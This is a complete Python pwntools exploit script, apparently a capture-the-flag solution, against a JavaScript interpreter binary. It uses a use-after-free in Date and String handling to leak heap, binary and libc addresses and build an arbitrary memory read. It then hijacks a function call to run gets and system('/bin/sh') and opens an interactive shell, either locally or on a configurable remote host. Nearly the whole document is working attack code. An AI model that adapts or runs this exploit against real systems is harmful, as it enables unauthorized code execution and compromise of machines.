#!/usr/bin/python

import pwn
from struct import pack, unpack


def float_to_hex(f):
  return unpack('<Q', pack('<d', f))[0]


def hex_to_float(n):
  return unpack('<d', pack('<Q', n))[0]


def oneline(s):
  return s.replace('\n', '').strip()


def decode_string(s):
  res = ''
  idx = 0
  while idx < len(s):
    if s[idx] == '\\':
      if s[idx + 1] == '\\':
        res += '\\'
        idx += 2
        continue

      if s[idx + 1] == 'u':
        res += s[idx + 4:idx + 6].decode('hex')
        idx += 6
        continue

      if s[idx + 1] == '\\':
        res += '\\'
        idx += 2
        continue

      if s[idx + 1] == 'b':
        res += '\b'
        idx += 2
        continue

      if s[idx + 1] == 'f':
        res += '\f'
        idx += 2
        continue

      if s[idx + 1] == 'n':
        res += '\n'
        idx += 2
        continue

      if s[idx + 1] == 'r':
        res += '\r'
        idx += 2
        continue

      if s[idx + 1] == 't':
        res += '\t'
        idx += 2
        continue

      assert(False)
    else:
      res += s[idx]
      idx += 1

  return res


def readaddr(r, addr):
  r.send('readaddr(%s)\n' % hex_to_float(addr).__repr__())
  s = r.recvuntil('\n>')
  s = s.split('\n')[1].split('String: ')[1][1:-2]
  return decode_string(s)


def findstring(r, start_addr, needle, step=1024):
  addr = start_addr
  while True:
    s = readaddr(r, addr)

    if needle in s:
      return addr + s.index(needle)

    addr += step


def callfunc(r, func_addr):
  # using UAF change Date to CFunction object and call it
  payload = \
    pack('<Q', 0) + \
    pack('<Q', func_addr) + \
    pack('<Q', 0) + \
    pack('<Q', 0) + \
    'A' * 60 + \
    '\x04\x00\x00'

  js_payload = \
    '''
    var d = null;
    var str = new String("%s");
    var oo = {'valueOf': function () { gc(); return NaN; }};
    var ooo = {'toString': function() { d(); }};
    gc();
    d = new Date(oo);
    str.concat(ooo);
    ''' % payload.__repr__()[1:-1]

  r.send(oneline(js_payload) + '\n')


remote_addr = None

binary_filename = './build/debug/js'

if remote_addr:
  r = pwn.remote(*remote_addr)
else:
  r = pwn.process(binary_filename, aslr = 0)
pwn.context.terminal = ['tmux', 'splitw', '-h']

# find useful offsets in binary

binary = pwn.ELF(binary_filename)

sentinel_offset = binary.symbols['sentinel']
realloc_got_offset = binary.got['realloc']

# find useful offsets in libc

libc = pwn.ELF('/lib/x86_64-linux-gnu/libc.so.6')
realloc_offset = libc.symbols['realloc']
system_offset = libc.symbols['system']
gets_offset = libc.symbols['gets']

# leak heap address

heap_leak_payload = \
  '''
  var d = null;
  var str = new String("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x07\\x00\\x00\\x00");
  var oo = {'valueOf': function () { gc(); return NaN; }};
  d = new Date(oo);
  str.concat("bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb");
  Number.prototype.valueOf.call(d);
  '''

r.recvuntil('>')
r.send(oneline(heap_leak_payload) + '\n')

heap_leak = float_to_hex(float(r.recvuntil('\n>').split('\n')[1]))
print 'heap_leak: 0x%x' % heap_leak

# define readaddr function that allows arbirtaty reading

readaddr_function = \
  '''
  function readaddr(addr) {
    gc();
    var a = null;
    var oo = {'valueOf': function () {
      gc();
      a = new String("%s");
      return addr;
    }};
    return new String(new Date(oo));
  }
  ''' % ('a'*1024) # here the addr is the offset of the new string...

r.send(oneline(readaddr_function) + '\n')
r.recvuntil('\n>')

# leak binary base

marker = 0xdeadbeef
r.send('var num = new Number(%s)\n' % hex_to_float(marker).__repr__())
r.recvuntil('\n>')

addr = heap_leak & ~(0x1000 - 1)

#   obj->properties = &sentinel;
# so we can use the address os sentinel to calc the binary_base
sentinel_addr = 0

while True:
  number_addr = findstring(r, addr, pack('<Q', marker))
  type_addr = number_addr + 0x5c
  type_value = unpack('<I', readaddr(r, type_addr)[:4])[0]

  if type_value == 7:
    properties_addr = number_addr + 0x38
    sentinel_addr = unpack('<Q', readaddr(r, properties_addr)[:8])[0]
    break

  addr = type_addr + 4

binary_base = sentinel_addr - sentinel_offset

print 'binary base: 0x%x' % binary_base

# leak libc base

realloc_addr = unpack('<Q', readaddr(r, realloc_got_offset + binary_base)[:8])[0]

libc_base = realloc_addr - realloc_offset

print 'libc base: 0x%x' % libc_base

system_addr = libc_base + system_offset

print 'system: 0x%x' % system_addr

gets_addr = libc_base + gets_offset

print 'gets: 0x%x' % gets_addr

callfunc(r, gets_addr)
r.send('/bin/sh\x00\n')

r.recvuntil('\n>')
callfunc(r, system_addr)

# shell
r.interactive()
